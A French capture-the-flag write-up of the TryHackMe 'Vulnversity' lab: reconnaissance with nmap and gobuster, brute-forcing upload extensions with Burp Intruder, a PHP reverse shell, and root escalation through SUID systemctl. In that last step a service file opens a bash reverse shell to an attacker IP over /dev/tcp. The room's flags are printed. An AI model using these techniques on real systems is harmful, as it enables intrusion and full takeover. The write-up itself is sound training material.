# vulnversity

dans ce tuto on s'attaque à la Room Vulnersity de TryHackMe.

https://tryhackme.com/room/vulnversity

Elle permet d'aborder les points suivants : 
* Le bruteforcing de formulaire web d'upload de fichier a la recherche d'extention de fichier autorisées.
* L'utilisation d'un reverse shell php
* L'elévation de privilège via


```sh
echo "10.10.227.79 vulnersity.thm" >> /etc/hosts
```

## [Task 2] Reconnaissance

### #2 Scanner le serveur, combien de port sont ouvert ?

```sh
nmap -Pn -sC -sV -vv -oN nmap.txt vulnersity.thm

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

> Réponse: **6 ports ouverts**

### #3	Quelle version de squid est installée ?

> Réponse: **3.5.12**

### #4 Combien de port nmap va scanner avec l'option -p-400 ?

Il est possible de scanner des plages de port via l'utilisatuion du "-" (e.g. `-p1-1023` )
Les valeurs de début et/ou de fin peuvent être ommisent. Si les les deux valeurs sont ommisent `-p-`, nmap va scanner du port 1 à 65535.

`-p-400` => 1 à 400 (inclus)

> Réponse: **400**

### #5 L'option -n de nmap premet de pas résoudre quoi ?

```
HOST DISCOVERY:
  -n/-R: Never do DNS resolution/Always resolve [default: sometimes]
```

> Réponse: **DNS**

### #6 	Quel est l'OS du serveur ?

```
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
```

> Réponse: **Ubuntu**

### #7 Sur quel port écoute le serveur web ?

```
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
```

> Réponse: **3333**


http://vulnersity.thm:3333/


## [Task 3] Locating directories using GoBuster 

```sh
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://vulnersity.thm:3333/
(...)
/internal (Status: 301)
```

http://vulnersity.thm:3333/internal/

## [Task 4] 

### #1 Try upload a few file types to the server, what common extension seems to be blocked?

> Réponse: **.php**

### #3 Extension Bruteforcing


Intercep 'on' => bloque chaque requete avant qu'elle ne soit envoyée au serveur et attend la validation manuelle (forward)
Intercept 'off' => laisse passer les requêtes et les capture.

Capturer la requete POST d'upload.

Envoyer la requête POST au plugin `Intruder`

Le module Intruder permet de rejouer des requêtes en les modifiants via des scripts pré-définis

*Intruder > Positions*

Supprimer l'ensemble des `§` pré-assignés => **Clear**

Les ajouter manuellement pour encapsuler l'extention : `Content-Disposition: form-data; name="file"; filename="phpinfo§.php§"`

*Intruder > Payload*

Ajouter les valeurs a tester à la main ou les charger à partir d'un fichier (e.g. `/usr/share/dirb/extensions_common.txt`)

```
php3
php4
php5
phtml
```

*Intruder > Options*

Grep- Match : `Extension not allowed` (attention aux espaces en fin de ligne !)

Start Attack


What extension is allowed?

> Réponse: **phtml**

### #4 Gain remote access

Test d'envoi du fichier `phpinfo.phtml`.

Ou est-ce qu'il est stocké ?


Modifier le reverser shell.pthml et l'uploader

Préparer le netcat

```
nc -lnvp 8443
```

Appeler l'URL du shell 

```
wget http://vulnersity.thm:3333/internal/uploads/shell.phtml
```

### #5 What user was running the web server?

```
cat /etc/passwd
ls /home
```

> Réponse: bill

```
www-data@vulnuniversity:/$ cat /home/bill/user.txt 
8bd7992fbe8a6ad22a63361004cfcedb
```

## [Task 5] Privilege Escalation


In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).

For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.


find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 23376 Jan 15  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
-rwsr-sr-x 1 root root 98440 Jan 29  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 76408 Jul 17  2019 /usr/lib/squid/pinger
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
-rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 35600 Mar  6  2017 /sbin/mount.cifs


https://gtfobins.github.io/gtfobins/systemctl/#suid

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp



TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.9.28.128/4444 0>&1"
[Install]
WantedBy=multi-user.target' > $TF

systemctl link $TF
systemctl enable --now $TF


nc -lvnp 4444

root@vulnuniversity:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@vulnuniversity:/# cat /root/root.txt   
cat /root/root.txt
a58ff8579f0a9270368d33a9966c7fd5
